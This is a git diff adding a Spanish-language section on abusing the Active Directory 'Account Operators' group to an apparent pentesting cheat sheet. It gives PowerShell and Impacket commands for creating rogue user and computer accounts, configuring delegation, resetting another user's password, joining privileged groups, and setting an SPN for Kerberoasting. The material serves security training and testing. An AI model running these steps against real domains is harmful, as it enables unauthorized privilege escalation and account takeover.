@@ -5061,6 +5061,93 @@ netexec ldap <RHOST> -u '<USERNAME>' --use-kcache --bloodhound --dns-tcp --dns-s
 ###  11.5. <a name='grupos-privilegiados'></a>Grupos Privilegiados
 
 ####  11.5.1. <a name='account-operators'></a>Account Operators
+
+Es un grupo incorporado de Active Directory pensado para delegar la gestión de cuentas de usuarios y grupos estándar, sin dar acceso completo de administración del dominio.
+
+##### Enumeración
+
+```powershell
+net group "Account Operators" /domain
+```
+
+O desde PowerView:
+
+```powershell
+Get-NetGroupMember -GroupName "Account Operators"
+```
+
+##### 🔑 Privilegios del grupo
+
+Por defecto, los miembros de Account Operators pueden:
+
+✅ Crear, modificar y eliminar cuentas de usuarios en los siguientes contenedores:
+
+- `CN=Users`
+- `CN=Computers`
+
+✅ Agregar usuarios a grupos locales (¡no de dominio!)
+✅ Leer y escribir muchos atributos de cuentas de usuario (como userAccountControl, description, etc.)
+✅ Resetear contraseñas de cuentas que no sean administradores.
+
+❌ No pueden tocar:
+
+- Miembros de grupos protegidos (ej: Domain Admins, Administrators, Enterprise Admins, etc.)
+- Atributos “sensibles” como adminCount = 1 (si está bien protegido)
+- Cuentas fuera del scope delegado (como en OUs personalizadas)
+
+##### ¿Cómo podés abusarlo para escalar privilegios?
+
+###### Ejemplo 1 – Crear un usuario + agregarlo a RBCD
+
+1. Crear un usuario
+
+    ```powershell
+    New-ADUser -Name "hacker" -SamAccountName hacker -AccountPassword (ConvertTo-SecureString "P@ssw0rd123" -AsPlainText -Force) -Enabled $true
+    ```
+
+2. Crear un equipo falso (computer account)
+
+    (Esto requiere que MachineAccountQuota esté > 0, o que tengamos permisos)
+
+    ```powershell
+    addcomputer.py -method SAMR -computer-name FAKEPC -computer-pass P@ss1234 -dc-ip 10.10.10.1 CORP.local/eviluser:P@ssw0rd123
+    ```
+
+3. Configurar RBCD en un equipo objetivo (si tenemos WriteDACL sobre él)
+
+    O con PowerView (desde Windows):
+
+    ```powershell
+    Set-ADComputer TargetHost -PrincipalsAllowedToDelegateToAccount FAKEPC$
+    ```
+
+4. Hacer impersonación y obtener acceso al target
+
+###### Ejemplo 2 - Cambiar la contraseña de otra cuenta
+
+Si encontramos un usuario sin `adminCount` y dentro del scope de Account Operators:
+
+```powershell
+Set-ADAccountPassword -Identity tyrell.wellick -Reset -NewPassword (ConvertTo-SecureString "Password123!" -AsPlainText -Force)
+```
+
+###### Ejemplo 3 – Agregar usuario a un grupo importante
+
+> Si tenemos WriteProperty o GenericAll sobre un grupo importante como "Server Operators" o "Backup Operators", podemos agregarnos.
+
+```powershell
+Add-ADGroupMember -Identity 'Server Operators' -Members hacker
+```
+
+Desde aquí, podemos abusar del grupo (como Backup Operators para leer SAM/NTDS.dit).
+
+###### Asignar SPN a un usuario - Kerberoasting
+
+```powershell
+Import-module .\PowerView.ps1
+Set-DomainObject -Identity tyrell.wellick -SET @{serviceprincipalname='nonexistent/FAKE'}
+```
+
 ####  11.5.2. <a name='server-operators'></a>Server Operators
 ####  11.5.3. <a name='dnsadmins'></a>DnsAdmins
 
